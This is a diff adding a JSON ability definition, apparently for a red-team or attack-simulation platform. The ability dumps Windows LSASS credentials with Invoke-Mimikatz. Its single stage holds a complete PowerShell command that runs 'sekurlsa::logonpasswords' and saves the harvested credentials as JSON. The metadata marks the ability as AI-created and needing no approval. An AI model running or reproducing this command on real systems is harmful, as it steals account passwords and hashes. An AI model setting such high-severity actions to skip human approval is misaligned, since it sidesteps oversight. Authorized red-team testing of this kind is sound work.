@@ -1,0 +1,36 @@
+{
+  "ability_id": "90affe17-02a9-443f-a661-23413a85585b",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:43:10.982689+00:00",
+  "ability": {
+    "name": "LSASS Dumping and Parsing via Invoke-Mimikatz",
+    "description": "Utilizes pre-uploaded Invoke-Mimikatz script to attempt credential harvesting and stores structured JSON.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1003.001",
+    "platform": "windows",
+    "impact_type": "read",
+    "default_severity": "high",
+    "requires_approval": false,
+    "tags": [
+      "mimikatz",
+      "lsass"
+    ],
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Execute Invoke-Mimikatz for LSASS parsing",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { . .\\\\Invoke-Mimikatz.ps1; $res = Invoke-Mimikatz -Command \\\"privilege::debug sekurlsa::logonpasswords\\\" -ErrorAction Stop; '{\\\"status\\\": \\\"success\\\", \\\"output\\\": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\\") + '\\\"}' } catch { '{\\\"status\\\": \\\"failed\\\", \\\"error\\\": \\\"' + $_.Exception.Message.Replace('\\\"', '\\\\\\\"') + '\\\"}' }) | Tee-Object -FilePath $d\\\\lsass_parsed.json",
+      "timeout_seconds": 150,
+      "payload_id": "1c71cf2c-533e-4cdf-8cc0-c10e54918309"
+    }
+  ],
+  "rationale": "Required verification of credential-dumping capabilities from LSASS.",
+  "provider": "Lead Red Team Operator",
+  "cited_urls": [
+    "https://attack.mitre.org/techniques/T1003/001/"
+  ]
+}
